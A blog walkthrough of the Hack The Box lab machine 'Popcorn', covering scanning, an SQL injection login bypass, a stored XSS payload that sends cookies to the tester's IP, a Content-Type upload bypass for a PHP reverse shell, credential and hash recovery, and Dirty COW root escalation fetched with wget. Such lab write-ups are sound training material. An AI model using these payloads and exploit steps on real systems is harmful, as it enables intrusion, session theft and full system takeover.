+++
date = '2025-02-23T23:16:24-05:00'
draft = false
title = 'HtB Popcorn'
tags = ['writeup','hack the box','medium','linux']
hideToc = false
+++
![HtB-Popcorn](/images/Popcorn.png)

Popcorn, while not overly complicated, contains quite a bit of content and it can be difficult for some users to locate the proper attack vector at first. This machine mainly focuses on different methods of web exploitation.

<!--more-->
---

## Scanning

### nmap

```sh
┌──(pl4stic㉿kali)-[~/htb/popcorn]
└─$ nmap -T4 -p- -A -v 10.129.139.55
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-18 23:46 EST
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://popcorn.htb/
|_http-server-header: Apache/2.2.12 (Ubuntu)
```

Update `/etc/hosts` file:
`echo "10.129.139.55    popcorn.htb`
### HTTP - 80/tcp

![popcorn1](/images/popcorn1.png)

```sh
┌──(pl4stic㉿kali)-[~/htb/popcorn]
└─$ gobuster dir -u http://popcorn.htb/ -w /usr/share/wordlists/dirb/big.txt      
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://popcorn.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 288]
/.htaccess            (Status: 403) [Size: 288]
/cgi-bin/             (Status: 403) [Size: 287]
/index                (Status: 200) [Size: 177]
/rename               (Status: 301) [Size: 311] [--> http://popcorn.htb/rename/]
/test                 (Status: 200) [Size: 47357]
/torrent              (Status: 301) [Size: 312] [--> http://popcorn.htb/torrent/]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

#### /rename

![popcorn2](/images/popcorn2.png)

#### /test

![popcorn3](/images/popcorn3.png)

#### /torrent

![popcorn4](/images/popcorn4.png)

## Initial Access

### SQL Injection on Login Page

Starting with the most developed endpoint (assumption) on the web server, I took a look at the `/torrent/` endpoint. Immediately noticed a login page, register page, and basic authentication functionality.  I created an account, poked around for a while, and then took a look at Burp Suite to see what the traffic looked like.

The POST request for logging in appeared to be quite simple, so figured I'd try some basic SQL injection payloads to see if it was vulnerable. Lucky for me, first try was a success.

`username=admin' or 1=1;-- -&password=bar`

![popcorn5](/images/popcorn5.png)

![popcorn6](/images/popcorn6.png)

### Stored XSS on News

On the admin portal, there is a section to add/edit news items (shows up on the front page). I tried a simple payload, `<script>alert(0);</script>` and was greeted with this on the homepage.

![popcorn7](/images/popcorn7.png)

Next, I updated the XSS payload to see if I could grab any other user's session cookie, but quickly realized it was probably a rabbit hole as there were only 2 active users:  my test account and the admin user.

`<img src=x onerror=this.src='http://10.10.14.141/?c='+document.cookie>`

### File Upload for Torrent Screenshot

Tried to upload a php reverse shell as the screenshot for the torrent file on the application, but was met with some sort of content filter.

![popcorn8](/images/popcorn8.png)

Let's try simply changing the `Content-Type` value to `image/png`.

![popcorn9](/images/popcorn9.png)

And, we're in.

```sh
┌──(pl4stic㉿kali)-[~/htb/popcorn]
└─$ nc -nvlp 4444 
listening on [any] 4444 ...
connect to [10.10.14.141] from (UNKNOWN) [10.129.139.55] 51054
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
 07:34:50 up 50 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: no job control in this shell
www-data@popcorn:/$
```

## Shell as www-data

### Enumeration

Looks like one one other user (except `root`) with a working account on the machine.

```sh
www-data@popcorn:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
george:x:1000:1000:George Papagiannopoulos,,,:/home/george:/bin/bash
```

Luckily enough, we can also go ahead and grab the user flag from `/home/george/user.txt`

Found some credentials in `/var/www/torrent/config.php`
```php
  //Edit This For TORRENT HOSTER Database
  //database configuration
  $CFG->host = "localhost";
  $CFG->dbName = "torrenthoster";       //db name
  $CFG->dbUserName = "torrent";    //db username
  $CFG->dbPassword = "SuperSecret!!";   //db password
```

And also some interesting tidbits in `/var/www/torrent/database/th_database.sql`
```sql
INSERT INTO `users` VALUES (3, 'Admin', '1844156d4166d94387f1a4ad031ca5fa', 'admin', 'admin@yourdomain.com', '2007-01-06 21:12:46', '2007-01-06 21:12:46');
```

#### Hash Crack

We can go ahead and crack that password for `Admin` we found in the `th_database.sql` file.

```sh
┌──(pl4stic㉿kali)-[~/htb/popcorn]
└─$ hashcat '1844156d4166d94387f1a4ad031ca5fa' /usr/share/wordlists/rockyou.txt -m 0
hashcat (v6.2.6) starting
[...snip...]
1844156d4166d94387f1a4ad031ca5fa:admin12                  
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 1844156d4166d94387f1a4ad031ca5fa
```

`Admin:admin12`

## Privilege Escalation

### Dirty C0W

After running `Linux Privilege Escalation Checker`, one of the returned results was for `Dirty C0W`. I pulled the `.c` script right from `searchsploit`, transferred to the victim machine, compiled, ran, and was able to get root privileges.

```sh
┌──(pl4stic㉿kali)-[~/htb/popcorn]
└─$ searchsploit dirty cow
-------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page (1)                | linux/dos/43199.c
Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page (2)                | linux/dos/44305.c
Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition Privi | linux/local/40616.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/self/mem' Race Condition Privilege Escal | linux/local/40847.cpp
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW PTRACE_POKEDATA' Race Condition (Write Access  | linux/local/40838.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Es | linux/local/40839.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' /proc/self/mem Race Condition (Write Access M | linux/local/40611.c
-------------------------------------------------------------------------------------- ---------------------------------
```

```sh
www-data@popcorn:/var/www$ wget http://10.10.14.142/40839.c

--2025-02-24 06:07:06--  http://10.10.14.142/40839.c
Connecting to 10.10.14.142:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4814 (4.7K) [text/x-csrc]
Saving to: `40839.c'

100%[======================================>] 4,814       --.-K/s   in 0s      

2025-02-24 06:07:06 (273 MB/s) - `40839.c' saved [4814/4814]
```

```sh
www-data@popcorn:/var/www$ gcc -pthread 40839.c -o exploit -lcrypt
www-data@popcorn:/var/www$ chmod +x exploit
www-data@popcorn:/var/www$ ./exploit

/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: pl4stic

Complete line:
firefart:fiX5006wR4PnE:0:0:pwned:/root:/bin/bash

mmap: b77a7000
```

Now just `su firefart`, use your new password, and enjoy root access.